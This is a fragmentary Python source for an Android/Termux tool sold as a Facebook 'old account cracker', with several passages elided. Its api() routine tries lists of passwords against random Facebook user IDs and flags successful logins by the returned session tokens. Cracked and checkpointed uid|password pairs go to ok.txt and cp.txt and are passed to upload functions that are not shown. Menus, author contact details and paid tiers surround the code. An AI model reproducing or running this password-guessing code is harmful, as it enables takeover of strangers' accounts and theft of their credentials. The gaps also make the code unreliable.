...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://wa.me/+919971945685"])
	exit(" [*] FACEBOOK :  https://www.facebook.com/MohsinAliOfficail")
...
def notice():
	...
	runtxt("\033[0;92m ADMIN WHATSAPP >> +919971945685")
	subprocess.check_output(["am", "start", "https://wa.me/+919971945685"])
...
==================================================
           CODED BY : MAFIYA HUNTER       
           WHATSAPP : +919971945685    
           FB PAGE  : MAFIYA HUNTER   
==================================================           
\x1b[0;91m\x1b[1;43m                  SYC0 TH3 BR4ND :)                 \x1b[0m""")
              
		print("%s [%sâ¢%s] %sTOOL NAME : %sFREE OLD ACCOUNT Cracker"%(G,R,G,B,G))
		print("%s [%sâ¢%s] %sVERSION   : %s0.8"%(G,R,G,B,G))
		...
		print("%s [%s2%s]%s CRACK RANDOM FB ID 2004-5 %s(GET APROVAL FIRST) V1"%(G,R,G,Y,G))
		print("%s [%s3%s]%s CRACK RANDOM FB ID 2004-5 %s(GET APROVAL FIRST) V2"%(G,R,G,Y,G))
		print("%s [%s4%s]%s CRACK RANDOM FB ID 2004 %s(PAID) V3"%(G,R,G,Y,G))
		print("%s [%s5%s]%s CRACK FROM EMAILS %s(PAID)"%(G,R,G,Y,G))
		print("%s [%s6%s]%s CRACK RANDOM FB ID Custom %s(PAID) V1"%(G,R,G,Y,G))
		print(GET)
		hoga = input("\n%s [?] CHOICE : "%(B))
		if hoga in ["", " "]:
			Main()
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [THE MOHSIN] : %s/%s -> \033[0;92m [ MOHSIN-OK:%s ]- \033[0;94m[MOHSIN-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[MOHSIN-OK] %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" [MOHSIN-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;94m[MOHSIN-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [MOHSIN-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
